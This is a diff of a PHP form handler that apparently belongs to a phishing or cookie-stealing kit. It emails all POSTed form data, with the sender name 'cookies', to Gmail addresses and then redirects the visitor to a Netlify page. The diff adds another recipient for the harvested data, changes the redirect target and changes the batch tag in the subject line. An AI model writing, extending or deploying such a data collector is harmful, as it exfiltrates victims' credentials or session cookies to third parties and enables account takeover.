@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://helpful-muffin-fe9523.netlify.app/");
+header("Location: https://jovial-sable-598e9d.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
@@ -37,6 +37,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $mail->setFrom('Lernayouamzaxal@gmail.com', 'cookies');
         $mail->addAddress('Lernayouamzaxal@gmail.com');
        $mail->addAddress('Lernayouamzaxal@gmail.com');
+       $mail->addAddress('morginmocin@gmail.com');
        
       
       
@@ -46,7 +47,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'fir Cookies';
+        $mail->Subject = 'abr4 Cookies';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
